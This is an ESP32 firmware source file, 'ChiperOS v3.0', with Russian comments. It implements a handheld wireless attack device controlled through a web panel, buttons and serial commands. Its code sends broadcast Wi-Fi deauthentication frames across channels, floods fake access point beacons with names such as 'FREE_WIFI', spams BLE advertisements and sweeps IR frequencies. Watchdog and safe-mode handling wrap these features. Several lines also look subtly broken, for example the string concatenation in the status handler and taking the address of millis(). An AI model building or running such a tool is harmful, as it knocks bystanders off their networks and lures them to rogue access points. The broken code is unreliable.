// 🛡️ ChiperOS v3.0 - с Watchdog, Safe Mode и Fallback Protocol
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <esp_wifi.h>
#include <driver/ledc.h>
#include <esp_task_wdt.h>
#include <Preferences.h>

// === PINS ===
#define BTN1 0
#define BTN2 1
#define BTN3 2
#define IR1 38
#define IR2 39
#define IR3 40

TFT_eSPI tft = TFT_eSPI();
WebServer server(80);
Preferences prefs;  // Для хранения состояния в памяти

// === STATE ===
enum Mode { WEB_MODE, ATTACK_MODE, SAFE_MODE };
Mode currentMode = WEB_MODE;
bool deauthOn = false, fakeApOn = false, bleOn = false, irGunOn = false;
unsigned long lastBtn = 0, lastDeauth = 0, lastBle = 0, lastFakeAp = 0, lastIr = 0;
unsigned long lastWebRequest = 0, lastLoop = 0;
int menuIdx = 0;
bool emergencyMode = false;

// === WATCHDOG & RECOVERY ===
#define WDT_TIMEOUT 10          // секунд до перезагрузки при зависании
#define WEB_TIMEOUT 30000       // мс без запросов до мягкого рестарта
#define CRASH_THRESHOLD 3       // крашей за 5 минут → вход в Safe Mode
#define SAFE_MODE_DURATION 300  // секунд работы в безопасном режиме

unsigned long bootTime = 0;
int crashCount = 0;
bool inSafeMode = false;

// === DEAUTH ===
uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xF0, 0xFF, 0x02, 0x00
};
// === FAKE AP NAMES ===
String fakeAPNames[6] = {"FREE_WIFI", "Starlink", "CipherNet", "Guest", "Public", "ChiperOS"};

// === IR BRUTE FORCE ===
int irFreq = 30000;
const int irFreqMin = 30000, irFreqMax = 56000, irFreqStep = 500;
int irPulseLen = 10;
bool irFwd = true;

// === FORWARD DECLARATIONS ===
void switchMode();
void updateTFT();
void triggerMenu();
void sendFakeAP();
void enterSafeMode();
void checkRecovery();
void handleSerialCommand();

// === HTML (упрощённый для Safe Mode) ===
const char* htmlNormal = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ChiperOS</title><style>
body{background:#0d1117;color:#0f0;font-family:monospace;text-align:center;padding:15px}
h1{color:#0ff} .c{background:#111;border:1px solid #333;padding:10px;margin:8px;border-radius:6px}
.b{padding:10px 15px;margin:4px;border:none;border-radius:4px;font-weight:bold;cursor:pointer}
.r{background:#d32f2f;color:#fff}.g{background:#388e3c;color:#fff}.b2{background:#1976d2;color:#fff}
.s{padding:4px;margin:4px;border-radius:3px;font-weight:bold}.on{background:#0f0;color:#000}.off{background:#333;color:#666}
</style></head><body>
<h1>🛡️ ChiperOS v3.0</h1>
<div class="c"><h3>WiFi</h3><div id="sD" class="s off">DEAUTH OFF</div><div id="sF" class="s off">FAKE AP OFF</div>
<button class="b r" onclick="t('deauth')">Deauth</button><button class="b g" onclick="t('fakeap')">FakeAP</button></div>
<div class="c"><h3>BLE & IR</h3><div id="sB" class="s off">BLE OFF</div><div id="sI" class="s off">IR SWEEP OFF</div>
<button class="b b2" onclick="t('ble')">BLE Spam</button><button class="b r" onclick="t('ir')">IR Sweep</button></div>
<div class="c"><h3>System</h3><button class="b" onclick="t('reset')">🔄 Soft Reset</button><button class="b" onclick="t('safe')">🛡️ Safe Mode</button></div>
<div class="c" id="st">Loading...</div>
<script>
function t(a){fetch('/'+a).then(r=>r.text()).then(d=>{document.getElementById('st').innerHTML=d;update();});}
function update(){fetch('/st').then(r=>r.text()).then(d=>{
  document.getElementById('sD').className='s '+(d.includes('DEAUTH:ON')?'on':'off');
  document.getElementById('sF').className='s '+(d.includes('FAKE:ON')?'on':'off');
  document.getElementById('sB').className='s '+(d.includes('BLE:ON')?'on':'off');
  document.getElementById('sI').className='s '+(d.includes('IR:ON')?'on':'off');
  document.getElementById('st').innerHTML=d;});}
setInterval(update,1000);update();
</script></body></html>
)rawliteral";

const char* htmlSafe = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>ChiperOS - SAFE MODE</title>
<style>body{background:#1a0000;color:#ff6b6b;font-family:monospace;text-align:center;padding:20px}h1{color:#ff4444} .warn{background:#330000;border:2px solid #ff4444;padding:15px;margin:10px;border-radius:8px}
.b{padding:12px 20px;margin:10px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;font-size:16px}
.red{background:#d32f2f;color:#fff}.green{background:#388e3c;color:#fff}</style></head><body>
<h1>⚠️ SAFE MODE</h1>
<div class="warn">System recovered from crash. Attacks disabled.</div>
<div class="warn">Heap: <span id="heap">?</span>KB | Boot: <span id="boot">?</span> | Crash: <span id="crash">?</span></div>
<button class="green" onclick="fetch('/exit').then(()=>location.reload())">✅ Exit Safe Mode</button>
<button class="red" onclick="fetch('/reset').then(()=>location.reload())">🔄 Full Reset</button>
<script>
setInterval(()=>fetch('/st').then(r=>r.json()).then(d=>{
  document.getElementById('heap').innerText=d.h;
  document.getElementById('boot').innerText=d.b;
  document.getElementById('crash').innerText=d.c;
}),2000);
</script></body></html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  pinMode(BTN1, INPUT_PULLUP); 
  pinMode(BTN2, INPUT_PULLUP); 
  pinMode(BTN3, INPUT_PULLUP);

  // Init Preferences для хранения состояния
  prefs.begin("chiper", false);
  bootTime = millis();
  crashCount = prefs.getInt("crashes", 0);
  
  // Проверка на частые краши → вход в Safe Mode
  if (crashCount >= CRASH_THRESHOLD) {
    Serial.println("⚠️ Too many crashes! Entering SAFE MODE");
    enterSafeMode();
  } else {
    // Увеличиваем счётчик, сбросим его при успешной работе
    prefs.putInt("crashes", crashCount + 1);
  }

  // Инициализация Hardware Watchdog
  esp_task_wdt_init(WDT_TIMEOUT, true);
  esp_task_wdt_add(NULL);

  // TFT Init
  delay(800);
  tft.init(); tft.setRotation(1); tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN); tft.setTextFont(2);
  
  if (inSafeMode) {
    tft.drawString("⚠️ SAFE MODE", 10, 10);
    tft.drawString("Crashes: " + String(crashCount), 10, 30);
  } else {    tft.drawString("ChiperOS v3.0", 10, 10);
  }
  
  #ifdef TFT_BL
    pinMode(TFT_BL, OUTPUT);
    digitalWrite(TFT_BL, HIGH);
  #endif

  // IR PWM Init
  ledcSetup(0, 38000, 8); ledcAttachPin(IR1, 0);
  ledcSetup(1, 38000, 8); ledcAttachPin(IR2, 1);
  ledcSetup(2, 38000, 8); ledcAttachPin(IR3, 2);
  ledcWrite(0, 0); ledcWrite(1, 0); ledcWrite(2, 0);

  // Deauth Frame
  memcpy(&deauthFrame[16], &deauthFrame[10], 6);

  // WiFi AP
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP("ChiperOS", "12345678");

  // Web Routes (динамический выбор интерфейса)
  server.on("/", [](){
    lastWebRequest = millis();
    server.send(200, "text/html", inSafeMode ? htmlSafe : htmlNormal);
  });
  
  server.on("/deauth", [](){ if(!inSafeMode){deauthOn=!deauthOn; switchMode();} server.send(200,"text/plain",deauthOn?"DEAUTH:ON":"DEAUTH:OFF"); });
  server.on("/fakeap", [](){ if(!inSafeMode){fakeApOn=!fakeApOn; switchMode();} server.send(200,"text/plain",fakeApOn?"FAKE:ON":"FAKE:OFF"); });
  server.on("/ble", [](){ if(!inSafeMode){bleOn=!bleOn; if(bleOn)BLEDevice::init("ESP32-S3");} server.send(200,"text/plain",bleOn?"BLE:ON":"BLE:OFF"); });
  server.on("/ir", [](){ if(!inSafeMode){irGunOn=!irGunOn; irFreq=irFreqMin;} server.send(200,"text/plain",irGunOn?"IR SWEEP ON":"IR SWEEP OFF"); });
  
  // Системные команды
  server.on("/reset", [](){ server.send(200,"text/plain","Resetting..."); delay(100); ESP.restart(); });
  server.on("/safe", [](){ enterSafeMode(); server.send(200,"text/plain","Entering Safe Mode"); });
  server.on("/exit", [](){ if(inSafeMode){ inSafeMode=false; prefs.putInt("crashes",0); switchMode();} server.send(200,"text/plain","Exiting Safe Mode"); });
  
  server.on("/st", [](){
    if (inSafeMode) {
      String j = "{\"h\":" + String(ESP.getFreeHeap()/1024) + ",\"b\":" + String(prefs.getInt("boots",0)) + ",\"c\":" + String(crashCount) + "}";
      server.send(200, "application/json", j);
    } else {
      String s = "DEAUTH:"+(deauthOn?"ON":"OFF")+"|FAKE:"+(fakeApOn?"ON":"OFF")+"|BLE:"+(bleOn?"ON":"OFF")+"|IR:"+(irGunOn?"ON":"OFF");
      s += "<br>Heap:"+String(ESP.getFreeHeap()/1024)+"KB PSRAM:"+String(ESP.getPsramSize()/1024)+"KB";
      s += "<br>IR Freq:"+String(irFreq)+"Hz Uptime:"+String((millis()-bootTime)/1000)+"s";
      server.send(200, "text/html", s);
    }
  });
  
  server.begin();
  tft.drawString("WiFi: 192.168.4.1", 10, 50);
  tft.drawString("Ready.", 10, 70);
  Serial.println("✅ ChiperOS v3.0 Ready");
  Serial.println("🛡️ Protection: WDT="+String(WDT_TIMEOUT)+"s, SafeMode after "+String(CRASH_THRESHOLD)+" crashes");
  
  // Сброс watchdog после успешного старта
  esp_task_wdt_reset();
  lastLoop = millis();
}

// === ВХОД В БЕЗОПАСНЫЙ РЕЖИМ ===
void enterSafeMode() {
  inSafeMode = true;
  currentMode = WEB_MODE;
  // Отключаем все атаки
  deauthOn = fakeApOn = bleOn = irGunOn = false;
  esp_wifi_set_promiscuous(false);
  BLEDevice::deinit();
  // Оставляем только базовый веб-сервер
  Serial.println("🛡️ SAFE MODE ACTIVATED - Attacks disabled, minimal services only");
  tft.fillScreen(TFT_BLACK);
  tft.drawString("⚠️ SAFE MODE", 10, 10);
}

// === ПРОВЕРКА ВОССТАНОВЛЕНИЯ ===
void checkRecovery() {
  // 1. Проверка веб-сервера (если нет запросов 30 сек в нормальном режиме)
  if (!inSafeMode && millis() - lastWebRequest > WEB_TIMEOUT && lastWebRequest > 0) {
    Serial.println("⚠️ No web requests for 30s - soft restarting web server");
    server.stop();
    delay(100);
    server.begin();
    lastWebRequest = millis();
  }
  
  // 2. Проверка зависания loop (если loop не выполнялся 5 сек)
  if (millis() - lastLoop > 5000) {
    Serial.println("⚠️ Loop freeze detected! Triggering WDT...");
    // Не делаем reset вручную, пусть WDT сделает это чисто
    while(1) delay(1); // Зависаем намеренно, чтобы сработал аппаратный вотчдог
  }
  
  // 3. Если в безопасном режиме > 5 минут и всё ок → предлагаем выход
  if (inSafeMode && millis() - bootTime > SAFE_MODE_DURATION * 1000) {
    static bool offered = false;
    if (!offered) {
      Serial.println("💡 Safe Mode timeout reached. Use /exit to return to normal.");
      offered = true;
    }  }
}

// === ОБРАБОТКА КОМАНД ЧЕРЕЗ SERIAL ===
void handleSerialCommand() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    cmd.toUpperCase();
    
    Serial.print("📥 Serial: "); Serial.println(cmd);
    
    if (cmd == "RESET" || cmd == "REBOOT") {
      Serial.println("🔄 Restarting...");
      ESP.restart();
    }
    else if (cmd == "SAFE" || cmd == "SAFEMODE") {
      enterSafeMode();
      Serial.println("🛡️ Entered Safe Mode");
    }
    else if (cmd == "EXIT" || cmd == "NORMAL") {
      if (inSafeMode) {
        inSafeMode = false;
        prefs.putInt("crashes", 0);
        switchMode();
        Serial.println("✅ Exited Safe Mode");
      }
    }
    else if (cmd == "STATUS") {
      Serial.println("=== SYSTEM STATUS ===");
      Serial.println("Mode: " + String(inSafeMode ? "SAFE" : "NORMAL"));
      Serial.println("Heap: " + String(ESP.getFreeHeap()) + " bytes");
      Serial.println("PSRAM: " + String(ESP.getPsramSize()) + " bytes");
      Serial.println("Uptime: " + String((millis()-bootTime)/1000) + "s");
      Serial.println("Crash count: " + String(crashCount));
      Serial.println("Deauth: " + String(deauthOn?"ON":"OFF"));
      Serial.println("FakeAP: " + String(fakeApOn?"ON":"OFF"));
      Serial.println("BLE: " + String(bleOn?"ON":"OFF"));
      Serial.println("IR: " + String(irGunOn?"ON":"OFF"));
      Serial.println("====================");
    }
    else if (cmd == "STOP" || cmd == "HALT") {
      deauthOn = fakeApOn = bleOn = irGunOn = false;
      switchMode();
      Serial.println("⏹️ All attacks stopped");
    }
    else {
      Serial.println("❓ Unknown command. Available: RESET, SAFE, EXIT, STATUS, STOP");
    }
  }}

void switchMode() {
  if (inSafeMode) return; // В безопасном режиме не переключаем атаки
  
  bool attack = deauthOn || fakeApOn || bleOn;
  if(attack && currentMode==WEB_MODE){
    currentMode=ATTACK_MODE;
    server.stop(); WiFi.softAPdisconnect(true);
    esp_wifi_set_promiscuous(true);
    tft.drawString("MODE: ATTACK", 10, 90);
  } else if(!attack && currentMode==ATTACK_MODE){
    currentMode=WEB_MODE;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_MODE_AP); WiFi.softAP("ChiperOS","12345678");
    server.begin();
    tft.drawString("MODE: WEB   ", 10, 90);
  }
}

void loop() {
  // 🔄 Сброс Watchdog в каждом цикле
  esp_task_wdt_reset();
  lastLoop = millis();
  
  // 🎮 Обработка кнопок
  if(millis()-lastBtn>200){
    lastBtn=millis();
    
    // АВАРИЙНАЯ КОМБИНАЦИЯ: BTN1+BTN3 = вход в Safe Mode
    if(digitalRead(BTN1)==LOW && digitalRead(BTN3)==LOW){
      static unsigned long comboStart = 0;
      if (comboStart == 0) comboStart = millis();
      if (millis() - comboStart > 2000) { // 2 секунды удержания
        Serial.println("🚨 Emergency combo detected! Entering Safe Mode");
        enterSafeMode();
        comboStart = 0;
      }
    } else {
      comboStart = 0;
    }
    
    // Обычные кнопки (только не в Safe Mode)
    if(!inSafeMode){
      if(digitalRead(BTN1)==LOW){ menuIdx=(menuIdx+1)%3; updateTFT(); }
      if(digitalRead(BTN2)==LOW){ triggerMenu(); }
      if(digitalRead(BTN3)==LOW){ 
        deauthOn=fakeApOn=bleOn=irGunOn=false; 
        switchMode(); 
        updateTFT();       }
    }
  }

  // 🌐 Веб-сервер (только в нормальном режиме или Safe Mode)
  if (currentMode==WEB_MODE || inSafeMode) {
    server.handleClient();
  }

  // 🛡️ Проверка восстановления
  checkRecovery();
  
  // 📡 Обработка Serial команд (ВСЕГДА активно, даже в атаке!)
  handleSerialCommand();

  // === АТАКИ (только если не в Safe Mode) ===
  if (!inSafeMode) {
    // Deauth
    if(deauthOn && millis()-lastDeauth>10){
      lastDeauth=millis();
      static int ch=1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      ch=(ch==1)?6:(ch==6)?11:1;
      deauthFrame[22]=random(256); deauthFrame[23]=random(256);
      esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
    }

    // Fake AP
    if(fakeApOn && millis()-lastFakeAp>200){
      lastFakeAp=millis();
      sendFakeAP();
    }

    // BLE Spam
    if(bleOn && millis()-lastBle>100){
      lastBle=millis();
      BLEAdvertising* p=BLEDevice::getAdvertising(); p->stop();
      p->addServiceUUID(BLEUUID((uint16_t)random(0x1800,0x2000)));
      p->setMinPreferred(0x06); p->setMaxPreferred(0x12); p->start();
    }

    // IR Sweep
    if(irGunOn && millis()-lastIr > irPulseLen){
      lastIr = millis();
      ledcSetup(0, irFreq, 8); ledcSetup(1, irFreq, 8); ledcSetup(2, irFreq, 8);
      ledcWrite(0, 85); ledcWrite(1, 85); ledcWrite(2, 85);
      if(irFwd) {
        irFreq += irFreqStep;
        if(irFreq >= irFreqMax) { irFreq = irFreqMax; irFwd = false; }
      } else {
        irFreq -= irFreqStep;        if(irFreq <= irFreqMin) { irFreq = irFreqMin; irFwd = true; }
      }
    }
  }

  // 📺 TFT Update
  static unsigned long lastTFT = 0;
  if(millis()-lastTFT>1000){
    lastTFT=millis();
    updateTFT();
  }
  
  // ✅ Если система стабильно работает 2 минуты → сбрасываем счётчик крашей
  if (!inSafeMode && millis() - bootTime > 120000 && prefs.getInt("crashes",0) > 0) {
    prefs.putInt("crashes", 0);
    Serial.println("✅ System stable for 2min - crash counter reset");
  }
  
  yield();
}

void triggerMenu(){
  if(menuIdx==0){ 
    tft.fillRect(0,110,240,40,TFT_BLACK);
    tft.drawString("Scanning...", 10, 110);
    int n=WiFi.scanNetworks();
    tft.drawString("Found: "+String(n)+" nets", 10, 110);
  }
  else if(menuIdx==1){ deauthOn=!deauthOn; switchMode(); }
  else if(menuIdx==2){ bleOn=!bleOn; if(bleOn)BLEDevice::init("ESP32-S3"); }
  updateTFT();
}

void updateTFT(){
  if (inSafeMode) {
    tft.fillRect(0,90,240,40,TFT_BLACK);
    tft.drawString("SAFE MODE", 10, 90);
    tft.drawString("Heap: "+String(ESP.getFreeHeap()/1024)+"KB", 10, 110);
  } else {
    tft.fillRect(0,70,240,80,TFT_BLACK);
    tft.drawString("Mode: "+String(currentMode==WEB_MODE?"WEB":"ATK"),10,70);
    tft.drawString("Heap: "+String(ESP.getFreeHeap()/1024)+"KB",10,90);
    tft.drawString("IR: "+String(irFreq)+"Hz",10,110);
  }
}

void sendFakeAP() {
  uint8_t beacon[128];
  memset(beacon, 0, 128);
  beacon[0]=0x80; beacon[1]=0x00; memset(&beacon[4],0xFF,6);  beacon[10]=0x02; beacon[11]=0x00; beacon[12]=0x00; beacon[13]=0x00; beacon[14]=0x00; beacon[15]=random(6);
  memcpy(&beacon[16],&beacon[10],6); memcpy(&beacon[24],&millis(),8);
  beacon[32]=0xE8; beacon[33]=0x03; beacon[34]=0x01; beacon[35]=0x00;
  
  int pos = 36;
  String ssidName = fakeAPNames[random(6)];
  if (ssidName.length() > 32) ssidName = ssidName.substring(0, 32);
  
  beacon[pos++] = 0x00;
  beacon[pos++] = ssidName.length();
  memcpy(&beacon[pos], ssidName.c_str(), ssidName.length());
  pos += ssidName.length();
  
  if (pos + 10 < 128) {
    beacon[pos++]=0x01; beacon[pos++]=0x08;
    beacon[pos++]=0x82; beacon[pos++]=0x84;
    beacon[pos++]=0x8B; beacon[pos++]=0x96;
    beacon[pos++]=0x24; beacon[pos++]=0x30;
    beacon[pos++]=0x48; beacon[pos++]=0x6C;
  }
  esp_wifi_80211_tx(WIFI_IF_AP, beacon, pos, false);
}
